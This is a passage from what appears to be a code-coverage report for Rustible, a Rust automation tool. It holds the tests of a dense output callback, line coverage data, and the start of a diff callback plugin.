self.host_stats.write();\n            let host_stats = stats.entry(result.host.clone()).or_default();\n\n            if !result.result.success {\n                host_stats.failed += 1;\n            } else if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Accumulate result by category\n        let category = ResultCategory::from_execution_result(result);\n        let accumulated = AccumulatedResult {\n            host: result.host.clone(),\n            msg: if !result.result.success {\n                Some(result.result.message.clone())\n            } else {\n                None\n            },\n        };\n\n        self.current_task_results\n            .write()\n            .entry(category)\n            .or_default()\n            .push(accumulated);\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        // Flush pending results\n        self.flush_task_results();\n\n        if self.config.use_colors {\n            println!(\"\\n{}: {}\", \"HANDLER\".bright_white().bold(), name.yellow());\n        } else {\n            println!(\"\\nHANDLER: {}\", name);\n        }\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        if self.config.verbosity \u003e 1 {\n            if self.config.use_colors {\n                println!(\"  {}: {}\", \"facts\".bright_black(), host);\n            } else {\n                println!(\"  facts: {}\", host);\n            }\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_dense_callback_name() {\n        let callback = DenseCallback::new();\n        // Verify it was created successfully\n        assert!(callback.config.use_colors);\n    }\n\n    #[test]\n    fn test_extract_host_prefix_and_number() {\n        assert_eq!(\n            DenseCallback::extract_host_prefix_and_number(\"web01\"),\n            Some((\"web\".to_string(), 1))\n        );\n        assert_eq!(\n            DenseCallback::extract_host_prefix_and_number(\"server123\"),\n            Some((\"server\".to_string(), 123))\n        );\n        assert_eq!(\n            DenseCallback::extract_host_prefix_and_number(\"db-node-05\"),\n            Some((\"db-node-\".to_string(), 5))\n        );\n        assert_eq!(\n            DenseCallback::extract_host_prefix_and_number(\"localhost\"),\n            None\n        );\n        assert_eq!(DenseCallback::extract_host_prefix_and_number(\"01\"), None);\n    }\n\n    #[test]\n    fn test_compress_host_ranges() {\n        // Consecutive hosts should be compressed\n        let hosts = vec![\n            \"web01\".to_string(),\n            \"web02\".to_string(),\n            \"web03\".to_string(),\n            \"web04\".to_string(),\n            \"web05\".to_string(),\n        ];\n        let compressed = DenseCallback::compress_host_ranges(\u0026hosts);\n        assert_eq!(compressed.len(), 1);\n        assert!(compressed[0].contains(\"[01:05]\"));\n\n        // Mixed hosts\n        let hosts = vec![\n            \"web01\".to_string(),\n            \"web02\".to_string(),\n            \"web03\".to_string(),\n            \"db01\".to_string(),\n            \"db02\".to_string(),\n        ];\n        let compressed = DenseCallback::compress_host_ranges(\u0026hosts);\n        // db hosts not enough for compression, web hosts are\n        assert!(compressed.iter().any(|h| h.contains(\"web[01:03]\")));\n\n        // Non-consecutive shouldn't compress\n        let hosts = vec![\n            \"web01\".to_string(),\n            \"web03\".to_string(),\n            \"web05\".to_string(),\n        ];\n        let compressed = DenseCallback::compress_host_ranges(\u0026hosts);\n        assert_eq!(compressed.len(), 3); // No compression\n    }\n\n    #[test]\n    #[ignore = \"host count threshold formatting needs refinement\"]\n    fn test_format_hosts_count_threshold() {\n        let config = DenseConfig::new().with_host_count_threshold(5);\n        let callback = DenseCallback::with_config(config);\n\n        // Under threshold - list all\n        let hosts = vec![\"h1\".to_string(), \"h2\".to_string(), \"h3\".to_string()];\n        let formatted = callback.format_hosts(\u0026hosts);\n        assert!(formatted.contains(\"h1\"));\n        assert!(!formatted.contains(\"hosts)\"));\n\n        // Over threshold - show count\n        let hosts: Vec\u003cString\u003e = (1..=10).map(|i| format!(\"host{}\", i)).collect();\n        let formatted = callback.format_hosts(\u0026hosts);\n        assert!(formatted.contains(\"10 hosts\"));\n    }\n\n    #[test]\n    fn test_result_category_from_execution_result() {\n        let ok_result = create_execution_result(\"test\", \"task\", true, false, false, \"ok\");\n        assert_eq!(\n            ResultCategory::from_execution_result(\u0026ok_result),\n            ResultCategory::Ok\n        );\n\n        let changed_result = create_execution_result(\"test\", \"task\", true, true, false, \"changed\");\n        assert_eq!(\n            ResultCategory::from_execution_result(\u0026changed_result),\n            ResultCategory::Changed\n        );\n\n        let failed_result = create_execution_result(\"test\", \"task\", false, false, false, \"error\");\n        assert_eq!(\n            ResultCategory::from_execution_result(\u0026failed_result),\n            ResultCategory::Failed\n        );\n\n        let skipped_result = create_execution_result(\"test\", \"task\", true, false, true, \"skipped\");\n        assert_eq!(\n            ResultCategory::from_execution_result(\u0026skipped_result),\n            ResultCategory::Skipped\n        );\n    }\n\n    #[test]\n    fn test_category_display_order() {\n        // Failed should come first\n        assert!(ResultCategory::Failed.display_order() \u003c ResultCategory::Ok.display_order());\n        assert!(\n            ResultCategory::Unreachable.display_order() \u003c ResultCategory::Changed.display_order()\n        );\n    }\n\n    #[test]\n    fn test_number_width() {\n        assert_eq!(DenseCallback::number_width(\"web01\"), 2);\n        assert_eq!(DenseCallback::number_width(\"server123\"), 3);\n        assert_eq!(DenseCallback::number_width(\"localhost\"), 0);\n    }\n\n    #[test]\n    fn test_format_host_list() {\n        let hosts = vec![\"h1\".to_string(), \"h2\".to_string(), \"h3\".to_string()];\n        let formatted = DenseCallback::format_host_list(\u0026hosts, 6);\n        assert_eq!(formatted, \"h1, h2, h3\");\n\n        // Should wrap\n        let formatted = DenseCallback::format_host_list(\u0026hosts, 2);\n        assert!(formatted.contains(\"\\n\"));\n    }\n\n    #[test]\n    fn test_config_builder() {\n        let config = DenseConfig::new()\n            .with_max_hosts_per_line(10)\n            .with_host_count_threshold(20)\n            .with_colors(false)\n            .with_verbosity(2);\n\n        assert_eq!(config.max_hosts_per_line, 10);\n        assert_eq!(config.host_count_threshold, 20);\n        assert!(!config.use_colors);\n        assert_eq!(config.verbosity, 2);\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = DenseCallback::default();\n        assert!(callback.config.use_colors);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = DenseCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\n            \u0026callback1.current_task_results,\n            \u0026callback2.current_task_results\n        ));\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n    }\n\n    #[tokio::test]\n    async fn test_playbook_lifecycle() {\n        let callback = DenseCallback::with_config(DenseConfig::new().with_colors(false));\n\n        callback.on_playbook_start(\"test-playbook\").await;\n\n        // Verify start time was set\n        assert!(callback.start_time.read().is_some());\n\n        callback.on_playbook_end(\"test-playbook\", true).await;\n    }\n\n    #[tokio::test]\n    async fn test_task_accumulation() {\n        let callback = DenseCallback::with_config(DenseConfig::new().with_colors(false));\n\n        callback.on_playbook_start(\"test\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        callback.on_task_start(\"Install nginx\", \"host1\").await;\n\n        let result1 = create_execution_result(\"host1\", \"Install nginx\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026result1).await;\n\n        let result2 =\n            create_execution_result(\"host2\", \"Install nginx\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026result2).await;\n\n        // Verify results were accumulated\n        let results = callback.current_task_results.read();\n        assert!(results.contains_key(\u0026ResultCategory::Ok));\n        assert!(results.contains_key(\u0026ResultCategory::Changed));\n    }\n\n    #[tokio::test]\n    async fn test_host_stats_tracking() {\n        let callback = DenseCallback::with_config(DenseConfig::new().with_colors(false));\n\n        callback.on_playbook_start(\"test\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback.on_task_start(\"task1\", \"host1\").await;\n        let result1 = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026result1).await;\n\n        callback.on_task_start(\"task2\", \"host1\").await;\n        let result2 = create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026result2).await;\n\n        callback.on_task_start(\"task3\", \"host1\").await;\n        let result3 = create_execution_result(\"host1\", \"task3\", false, false, false, \"failed\");\n        callback.on_task_complete(\u0026result3).await;\n\n        let stats = callback.host_stats.read();\n        let host_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host_stats.ok, 1);\n        assert_eq!(host_stats.changed, 1);\n        assert_eq!(host_stats.failed, 1);\n    }\n}\n","traces":[{"line":63,"address":[29043600],"length":1,"stats":{"Line":1}},{"line":75,"address":[29025840],"length":1,"stats":{"Line":1}},{"line":76,"address":[29025848],"length":1,"stats":{"Line":1}},{"line":80,"address":[29025744],"length":1,"stats":{"Line":1}},{"line":81,"address":[29025752],"length":1,"stats":{"Line":1}},{"line":82,"address":[29025755],"length":1,"stats":{"Line":1}},{"line":86,"address":[29025792],"length":1,"stats":{"Line":1}},{"line":87,"address":[29025800],"length":1,"stats":{"Line":1}},{"line":88,"address":[29025804],"length":1,"stats":{"Line":1}},{"line":92,"address":[29025648],"length":1,"stats":{"Line":1}},{"line":93,"address":[29025662],"length":1,"stats":{"Line":1}},{"line":94,"address":[29025668],"length":1,"stats":{"Line":1}},{"line":98,"address":[29025696],"length":1,"stats":{"Line":1}},{"line":99,"address":[29025705],"length":1,"stats":{"Line":1}},{"line":100,"address":[29025708],"length":1,"stats":{"Line":1}},{"line":115,"address":[29043136],"length":1,"stats":{"Line":1}},{"line":116,"address":[29043160,29043146],"length":1,"stats":{"Line":2}},{"line":117,"address":[29043155],"length":1,"stats":{"Line":1}},{"line":118,"address":[29043167,29043204],"length":1,"stats":{"Line":2}},{"line":119,"address":[29043199],"length":1,"stats":{"Line":1}},{"line":120,"address":[29043211,29043188,29043218],"length":1,"stats":{"Line":3}},{"line":121,"address":[29043213],"length":1,"stats":{"Line":1}},{"line":123,"address":[29043206],"length":1,"stats":{"Line":1}},{"line":127,"address":[29043232],"length":1,"stats":{"Line":1}},{"line":128,"address":[29043237],"length":1,"stats":{"Line":1}},{"line":129,"address":[29043268],"length":1,"stats":{"Line":1}},{"line":130,"address":[29043291],"length":1,"stats":{"Line":1}},{"line":131,"address":[29043314],"length":1,"stats":{"Line":0}},{"line":132,"address":[29043337],"length":1,"stats":{"Line":0}},{"line":133,"address":[29043360],"length":1,"stats":{"Line":0}},{"line":138,"address":[29043056],"length":1,"stats":{"Line":1}},{"line":139,"address":[29043061],"length":1,"stats":{"Line":1}},{"line":140,"address":[29043113],"length":1,"stats":{"Line":1}},{"line":141,"address":[29043120],"length":1,"stats":{"Line":1}},{"line":142,"address":[29043099],"length":1,"stats":{"Line":1}},{"line":143,"address":[29043092],"length":1,"stats":{"Line":1}},{"line":144,"address":[29043106],"length":1,"stats":{"Line":0}},{"line":167,"address":[29043408],"length":1,"stats":{"Line":0}},{"line":168,"address":[29043418],"length":1,"stats":{"Line":0}},{"line":171,"address":[29043392],"length":1,"stats":{"Line":0}},{"line":172,"address":[29043397],"length":1,"stats":{"Line":0}},{"line":211,"address":[29043008],"length":1,"stats":{"Line":1}},{"line":212,"address":[29043021],"length":1,"stats":{"Line":1}},{"line":216,"address":[29025872,29026427],"length":1,"stats":{"Line":1}},{"line":219,"address":[29025907],"length":1,"stats":{"Line":1}},{"line":220,"address":[29026033,29025957],"length":1,"stats":{"Line":2}},{"line":221,"address":[29026066,29026126],"length":1,"stats":{"Line":2}},{"line":222,"address":[29026231,29026179],"length":1,"stats":{"Line":2}},{"line":223,"address":[29026318,29026266],"length":1,"stats":{"Line":2}},{"line":233,"address":[29026448,29026958,29026952],"length":1,"stats":{"Line":1}},{"line":234,"address":[29026520],"length":1,"stats":{"Line":1}},{"line":235,"address":[29026552],"length":1,"stats":{"Line":0}},{"line":239,"address":[29026539],"length":1,"stats":{"Line":1}},{"line":240,"address":[29026619],"length":1,"stats":{"Line":0}},{"line":244,"address":[29026585],"length":1,"stats":{"Line":1}},{"line":247,"address":[29026595,29026813],"length":1,"stats":{"Line":2}},{"line":248,"address":[29026849,29026925],"length":1,"stats":{"Line":0}},{"line":252,"address":[29026838],"length":1,"stats":{"Line":1}},{"line":257,"address":[29042050,29042458,29039168],"length":1,"stats":{"Line":1}},{"line":258,"address":[29039223],"length":1,"stats":{"Line":1}},{"line":259,"address":[29039333],"length":1,"stats":{"Line":1}},{"line":262,"address":[29039253],"length":1,"stats":{"Line":1}},{"line":263,"address":[29039302],"length":1,"stats":{"Line":1}},{"line":264,"address":[29039476,29039384],"length":1,"stats":{"Line":2}},{"line":267,"address":[29039495],"length":1,"stats":{"Line":1}},{"line":269,"address":[29039602,29039502],"length":1,"stats":{"Line":2}},{"line":270,"address":[29042098,29039716],"length":1,"stats":{"Line":2}},{"line":271,"address":[29042216,29042261],"length":1,"stats":{"Line":2}},{"line":273,"address":[29042411,29042231],"length":1,"stats":{"Line":0}},{"line":278,"address":[29039742,29039910],"length":1,"stats":{"Line":2}},{"line":279,"address":[29040261,29040027],"length":1,"stats":{"Line":2}},{"line":281,"address":[29041904,29040298,29041777],"length":1,"stats":{"Line":3}},{"line":282,"address":[29041973,29042045],"length":1,"stats":{"Line":2}},{"line":287,"address":[29040275,29040380],"length":1,"stats":{"Line":4}},{"line":290,"address":[29040387],"length":1,"stats":{"Line":1}},{"line":291,"address":[29041203,29040399],"length":1,"stats":{"Line":2}},{"line":292,"address":[29040474,29040594],"length":1,"stats":{"Line":2}},{"line":293,"address":[29040604],"length":1,"stats":{"Line":1}},{"line":294,"address":[29040618,29040664],"length":1,"stats":{"Line":1}},{"line":296,"address":[29040662,29040684,29040788,29041751],"length":1,"stats":{"Line":4}},{"line":297,"address":[29041703,29040899],"length":1,"stats":{"Line":2}},{"line":298,"address":[29041756,29041713],"length":1,"stats":{"Line":1}},{"line":301,"address":[29040744,29040945],"length":1,"stats":{"Line":2}},{"line":303,"address":[29041011,29041269],"length":1,"stats":{"Line":2}},{"line":304,"address":[29041329],"length":1,"stats":{"Line":1}},{"line":313,"address":[29041059,29040974],"length":1,"stats":{"Line":2}},{"line":314,"address":[29041160,29041213],"length":1,"stats":{"Line":2}},{"line":318,"address":[29041187],"length":1,"stats":{"Line":1}},{"line":322,"address":[29040060],"length":1,"stats":{"Line":1}},{"line":323,"address":[29040130],"length":1,"stats":{"Line":1}},{"line":328,"address":[29042496],"length":1,"stats":{"Line":1}},{"line":333,"address":[29042571],"length":1,"stats":{"Line":3}},{"line":335,"address":[29042601],"length":1,"stats":{"Line":3}},{"line":337,"address":[29042616],"length":1,"stats":{"Line":1}},{"line":338,"address":[29042645],"length":1,"stats":{"Line":1}},{"line":339,"address":[29042689],"length":1,"stats":{"Line":1}},{"line":340,"address":[29042749],"length":1,"stats":{"Line":1}},{"line":341,"address":[29042784],"length":1,"stats":{"Line":1}},{"line":342,"address":[29042866],"length":1,"stats":{"Line":1}},{"line":347,"address":[29042656],"length":1,"stats":{"Line":1}},{"line":351,"address":[29026976],"length":1,"stats":{"Line":1}},{"line":352,"address":[29026990],"length":1,"stats":{"Line":1}},{"line":354,"address":[29027010],"length":1,"stats":{"Line":3}},{"line":359,"address":[29030431,29029872,29030437],"length":1,"stats":{"Line":1}},{"line":360,"address":[29029944],"length":1,"stats":{"Line":1}},{"line":361,"address":[29029975],"length":1,"stats":{"Line":0}},{"line":364,"address":[29029963],"length":1,"stats":{"Line":1}},{"line":365,"address":[29030048],"length":1,"stats":{"Line":1}},{"line":369,"address":[29029985],"length":1,"stats":{"Line":1}},{"line":370,"address":[29030014,29030123],"length":1,"stats":{"Line":2}},{"line":371,"address":[29030402,29030283],"length":1,"stats":{"Line":2}},{"line":373,"address":[29030315],"length":1,"stats":{"Line":1}},{"line":377,"address":[29027040,29028375,29029845],"length":1,"stats":{"Line":1}},{"line":378,"address":[29027123],"length":1,"stats":{"Line":1}},{"line":382,"address":[29027148],"length":1,"stats":{"Line":3}},{"line":383,"address":[29027295,29027190],"length":1,"stats":{"Line":2}},{"line":384,"address":[29027386,29027310],"length":1,"stats":{"Line":2}},{"line":386,"address":[29027402],"length":1,"stats":{"Line":1}},{"line":387,"address":[29027443],"length":1,"stats":{"Line":0}},{"line":388,"address":[29027760,29027579],"length":1,"stats":{"Line":0}},{"line":389,"address":[29027797,29027617],"length":1,"stats":{"Line":0}},{"line":390,"address":[29027799,29027655],"length":1,"stats":{"Line":0}},{"line":391,"address":[29027690,29027801],"length":1,"stats":{"Line":0}},{"line":392,"address":[29027725,29027803],"length":1,"stats":{"Line":0}},{"line":394,"address":[29027849,29027770],"length":1,"stats":{"Line":0}},{"line":396,"address":[29027416,29027477],"length":1,"stats":{"Line":2}},{"line":400,"address":[29028003,29027548,29027944],"length":1,"stats":{"Line":3}},{"line":401,"address":[29027984],"length":1,"stats":{"Line":0}},{"line":402,"address":[29028389,29028443,29028467],"length":1,"stats":{"Line":0}},{"line":403,"address":[29028451],"length":1,"stats":{"Line":0}},{"line":404,"address":[29028682,29028534],"length":1,"stats":{"Line":0}},{"line":406,"address":[29028551,29028499],"length":1,"stats":{"Line":0}},{"line":408,"address":[29028630,29028906],"length":1,"stats":{"Line":0}},{"line":409,"address":[29028926,29028979],"length":1,"stats":{"Line":0}},{"line":411,"address":[29028953,29029050],"length":1,"stats":{"Line":0}},{"line":414,"address":[29029074,29028398],"length":1,"stats":{"Line":0}},{"line":415,"address":[29029109],"length":1,"stats":{"Line":0}},{"line":416,"address":[29029249],"length":1,"stats":{"Line":0}},{"line":417,"address":[29029313,29029456],"length":1,"stats":{"Line":0}},{"line":419,"address":[29029281,29029329],"length":1,"stats":{"Line":0}},{"line":421,"address":[29029677,29029405],"length":1,"stats":{"Line":0}},{"line":422,"address":[29029697,29029750],"length":1,"stats":{"Line":0}},{"line":424,"address":[29029821,29029724],"length":1,"stats":{"Line":0}},{"line":429,"address":[29028017],"length":1,"stats":{"Line":1}},{"line":430,"address":[29028186,29028066],"length":1,"stats":{"Line":0}},{"line":432,"address":[29028083,29028031],"length":1,"stats":{"Line":2}},{"line":438,"address":[29038352,29039126,29039147],"length":1,"stats":{"Line":1}},{"line":439,"address":[29038372],"length":1,"stats":{"Line":1}},{"line":440,"address":[29038464,29038410],"length":1,"stats":{"Line":2}},{"line":445,"address":[29038490,29038530],"length":1,"stats":{"Line":2}},{"line":446,"address":[29038593,29038661],"length":1,"stats":{"Line":2}},{"line":448,"address":[29038668,29038852],"length":1,"stats":{"Line":2}},{"line":449,"address":[29038905,29039000],"length":1,"stats":{"Line":2}},{"line":450,"address":[29039076],"length":1,"stats":{"Line":1}},{"line":454,"address":[29038937],"length":1,"stats":{"Line":1}},{"line":458,"address":[29036272,29037354,29037360],"length":1,"stats":{"Line":1}},{"line":459,"address":[29036312],"length":1,"stats":{"Line":1}},{"line":460,"address":[29036505,29036442],"length":1,"stats":{"Line":2}},{"line":462,"address":[29036554],"length":1,"stats":{"Line":1}},{"line":463,"address":[29036973,29036892],"length":1,"stats":{"Line":0}},{"line":469,"address":[29036565,29036677],"length":1,"stats":{"Line":2}},{"line":472,"address":[29036796],"length":1,"stats":{"Line":1}},{"line":473,"address":[29037237],"length":1,"stats":{"Line":0}},{"line":478,"address":[29038328,29037376,29038334],"length":1,"stats":{"Line":1}},{"line":479,"address":[29037411],"length":1,"stats":{"Line":1}},{"line":480,"address":[29037601,29037538],"length":1,"stats":{"Line":2}},{"line":482,"address":[29037650],"length":1,"stats":{"Line":1}},{"line":483,"address":[29038069,29037989],"length":1,"stats":{"Line":0}},{"line":489,"address":[29037661,29037773],"length":1,"stats":{"Line":2}},{"line":494,"address":[29030464,29035160,29036244],"length":1,"stats":{"Line":1}},{"line":495,"address":[29030487],"length":1,"stats":{"Line":1}},{"line":496,"address":[29030613,29030514],"length":1,"stats":{"Line":1}},{"line":498,"address":[29030605],"length":1,"stats":{"Line":1}},{"line":499,"address":[29031048,29030961],"length":1,"stats":{"Line":0}},{"line":505,"address":[29030759,29030634],"length":1,"stats":{"Line":2}},{"line":508,"address":[29030881,29031296],"length":1,"stats":{"Line":2}},{"line":511,"address":[29031334],"length":1,"stats":{"Line":1}},{"line":512,"address":[29031345],"length":1,"stats":{"Line":1}},{"line":513,"address":[29031356],"length":1,"stats":{"Line":1}},{"line":514,"address":[29031375],"length":1,"stats":{"Line":1}},{"line":515,"address":[29031422],"length":1,"stats":{"Line":1}},{"line":517,"address":[29031558,29031486],"length":1,"stats":{"Line":2}},{"line":518,"address":[29035830,29035799,29031756],"length":1,"stats":{"Line":0}},{"line":519,"address":[29035806,29035893,29035862],"length":1,"stats":{"Line":0}},{"line":520,"address":[29035941,29035923,29035869],"length":1,"stats":{"Line":0}},{"line":522,"address":[29035963,29035930],"length":1,"stats":{"Line":0}},{"line":523,"address":[29036103,29035996],"length":1,"stats":{"Line":0}},{"line":524,"address":[29035977,29036019],"length":1,"stats":{"Line":0}},{"line":525,"address":[29036036],"length":1,"stats":{"Line":0}},{"line":530,"address":[29031797],"length":1,"stats":{"Line":1}},{"line":531,"address":[29032352],"length":1,"stats":{"Line":0}},{"line":542,"address":[29031899],"length":1,"stats":{"Line":1}},{"line":552,"address":[29033001,29032190],"length":1,"stats":{"Line":2}},{"line":553,"address":[29033015],"length":1,"stats":{"Line":0}},{"line":554,"address":[29033072,29033158],"length":1,"stats":{"Line":0}},{"line":556,"address":[29033103,29033046],"length":1,"stats":{"Line":0}},{"line":559,"address":[29033371,29033132],"length":1,"stats":{"Line":0}},{"line":560,"address":[29033510],"length":1,"stats":{"Line":0}},{"line":561,"address":[29034036,29034462,29034606,29034298,29034528,29033967,29034200,29034134,29034364],"length":1,"stats":{"Line":0}},{"line":570,"address":[29033521,29033645],"length":1,"stats":{"Line":0}},{"line":583,"address":[29033031,29035188],"length":1,"stats":{"Line":1}},{"line":584,"address":[29035221],"length":1,"stats":{"Line":0}},{"line":585,"address":[29035291],"length":1,"stats":{"Line":0}},{"line":586,"address":[29035332,29035511],"length":1,"stats":{"Line":0}},{"line":588,"address":[29035305,29035410],"length":1,"stats":{"Line":0}},{"line":595,"address":[29043872],"length":1,"stats":{"Line":1}},{"line":596,"address":[29043880],"length":1,"stats":{"Line":1}},{"line":601,"address":[29025120,29025510,29025504],"length":1,"stats":{"Line":1}},{"line":603,"address":[29025147],"length":1,"stats":{"Line":1}},{"line":604,"address":[29025166],"length":1,"stats":{"Line":1}},{"line":605,"address":[29025241,29025181],"length":1,"stats":{"Line":2}},{"line":606,"address":[29025246,29025303],"length":1,"stats":{"Line":2}},{"line":607,"address":[29025308,29025365],"length":1,"stats":{"Line":2}},{"line":608,"address":[29025370],"length":1,"stats":{"Line":1}},{"line":615,"address":[30731921,30731085,30730960,30730988,30731058,30731432],"length":1,"stats":{"Line":4}},{"line":616,"address":[30731147,30731038],"length":1,"stats":{"Line":2}},{"line":617,"address":[30731288],"length":1,"stats":{"Line":1}},{"line":619,"address":[30731421],"length":1,"stats":{"Line":1}},{"line":620,"address":[30731453],"length":1,"stats":{"Line":0}},{"line":621,"address":[30731495,30731605],"length":1,"stats":{"Line":0}},{"line":623,"address":[30731464,30731526],"length":1,"stats":{"Line":0}},{"line":628,"address":[29023627],"length":1,"stats":{"Line":4}},{"line":630,"address":[30727821],"length":1,"stats":{"Line":1}},{"line":633,"address":[30727899],"length":1,"stats":{"Line":1}},{"line":635,"address":[30727911],"length":1,"stats":{"Line":1}},{"line":636,"address":[30728047],"length":1,"stats":{"Line":1}},{"line":637,"address":[30728095,30728154],"length":1,"stats":{"Line":2}},{"line":638,"address":[30728169],"length":1,"stats":{"Line":1}},{"line":639,"address":[30728191],"length":1,"stats":{"Line":1}},{"line":640,"address":[30728383,30728350],"length":1,"stats":{"Line":0}},{"line":642,"address":[30728316,30728381],"length":1,"stats":{"Line":2}},{"line":644,"address":[30728178],"length":1,"stats":{"Line":0}},{"line":645,"address":[30728237,30728287],"length":1,"stats":{"Line":0}},{"line":647,"address":[30728203,30728268],"length":1,"stats":{"Line":0}},{"line":650,"address":[30728501,30728683],"length":1,"stats":{"Line":2}},{"line":663,"address":[30725952,30725980,30726471,30726037,30726064,30726389],"length":1,"stats":{"Line":4}},{"line":665,"address":[30726030],"length":1,"stats":{"Line":1}},{"line":667,"address":[30726113],"length":1,"stats":{"Line":1}},{"line":670,"address":[30726137],"length":1,"stats":{"Line":1}},{"line":671,"address":[30726268,30726192],"length":1,"stats":{"Line":2}},{"line":672,"address":[30726410,30726360],"length":1,"stats":{"Line":2}},{"line":676,"address":[29023403],"length":1,"stats":{"Line":0}},{"line":678,"address":[30725844],"length":1,"stats":{"Line":0}},{"line":681,"address":[29023549],"length":1,"stats":{"Line":4}},{"line":683,"address":[30726598,30726685],"length":1,"stats":{"Line":2}},{"line":684,"address":[30726857],"length":1,"stats":{"Line":1}},{"line":686,"address":[30727009],"length":1,"stats":{"Line":1}},{"line":689,"address":[30727026],"length":1,"stats":{"Line":1}},{"line":690,"address":[30727046,30727073,30727270,30727629,30727332],"length":1,"stats":{"Line":1}},{"line":691,"address":[30727463],"length":1,"stats":{"Line":1}},{"line":695,"address":[29023694],"length":1,"stats":{"Line":4}},{"line":698,"address":[30729197,30729110],"length":1,"stats":{"Line":2}},{"line":699,"address":[30729282,30729231],"length":1,"stats":{"Line":2}},{"line":701,"address":[30729371,30729439],"length":1,"stats":{"Line":2}},{"line":702,"address":[30729436,30729441,30729389],"length":1,"stats":{"Line":2}},{"line":703,"address":[30729652,30729412],"length":1,"stats":{"Line":1}},{"line":704,"address":[30729657,30729501,30729649],"length":1,"stats":{"Line":0}},{"line":705,"address":[30729614,30729481,30729579],"length":1,"stats":{"Line":3}},{"line":706,"address":[30729550,30729619,30729611],"length":1,"stats":{"Line":2}},{"line":708,"address":[30729528,30729577,30729581],"length":1,"stats":{"Line":2}},{"line":713,"address":[30729683],"length":1,"stats":{"Line":1}},{"line":715,"address":[30729714],"length":1,"stats":{"Line":1}},{"line":716,"address":[30729777,30729840],"length":1,"stats":{"Line":2}},{"line":723,"address":[30730008,30730096],"length":1,"stats":{"Line":2}},{"line":725,"address":[30730170],"length":1,"stats":{"Line":1}},{"line":727,"address":[30730132,30730213],"length":1,"stats":{"Line":1}},{"line":730,"address":[29023891],"length":1,"stats":{"Line":0}},{"line":732,"address":[30732045],"length":1,"stats":{"Line":0}},{"line":734,"address":[30732122],"length":1,"stats":{"Line":0}},{"line":735,"address":[30732284,30732164],"length":1,"stats":{"Line":0}},{"line":737,"address":[30732192,30732133],"length":1,"stats":{"Line":0}},{"line":741,"address":[29023752],"length":1,"stats":{"Line":0}},{"line":742,"address":[30730462],"length":1,"stats":{"Line":0}},{"line":743,"address":[30730518],"length":1,"stats":{"Line":0}},{"line":744,"address":[30730560,30730711],"length":1,"stats":{"Line":0}},{"line":746,"address":[30730632,30730529],"length":1,"stats":{"Line":0}}],"covered":196,"coverable":276},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","diff.rs"],"content":"//! Diff callback plugin for Rustible.\n//!\n//! This plugin displays before/after diffs for changed files, providing\n//! visibility into exactly what changes are being made during execution.\n//!\n//! # Features\n//!\n//! - **Unified diff format**: Standard unified diff output for familiarity\n//! - **Color-coded output**: Green for additions, red for deletions\n//! - **Composable**: Can be combined with other callbacks via `CompositeCallback`\n//! - **Respects --diff flag**: Only shows diffs when diff mode is enabled\n//!\n//! # Example Output\n//!\n//! ```text\n//! TASK [Update nginx config] ****************************************************\n//! --- before: /etc/nginx/nginx.conf\n//! +++ after: /etc/nginx/nginx.conf\n//! @@ -10,7 +10,7 @@\n//!      server {\n//!          listen 80;\n//! -        server_name old.example.com;\n//! +        server_name new.example.com;\n//!          root /var/www/html;\n//!      }\n//!  }\n//! changed: [webserver1]\n//! ```\n\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse similar::{ChangeTag, TextDiff};\nuse tokio::sync::RwLock;\n\nuse crate::executor::task::TaskDiff;\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult, ModuleDiff};\n\n/// Configuration for the diff callback plugin.\n#[derive(Debug, Clone)]\npub struct DiffConfig {\n    /// Number of context lines to show around changes (default: 3)\n    pub context_lines: usize,\n    /// Whether to use color in output (default: true)\n    pub use_color: bool,\n    /// Whether to show line numbers (default: true)\n    pub show_line_numbers: bool,\n    /// Maximum lines to display per diff (default: 100, 0 = unlimited)\n    pub max_lines: usize,\n    /// Whether diff mode is enabled (respects --diff flag)\n    pub enabled: bool,\n}\n\nimpl Default for DiffConfig {\n    fn default() -\u003e Self {\n        Self {\n            context_lines: 3,\n            use_color: true,\n            show_line_numbers: true,\n            max_lines: 100,\n            enabled: true,\n        }\n    }\n}\n\nimpl DiffConfig {\n    /// Create a new config with diff mode enabled.\n    pub fn enabled() -\u003e Self {\n        Self::default()\n    }\n\n    /// Create a new config with diff mode disabled.\n    pub fn disabled() -\u003e Self {\n        Self {\n            enabled: false,\n            ..Default::default()\n        }\n    }\n\n    /// Set the number of context lines.\n    pub fn with_context_lines(mut self, lines: usize) -\u003e Self {\n        self.context_lines = lines;\n        self\n    }\n\n    /// Enable or disable color output.\n    pub fn with_color(mut self, use_color: bool) -\u003e Self {\n        self.use_color = use_color;\n        self\n    }\n\n    /// Enable or disable line numbers.\n    pub 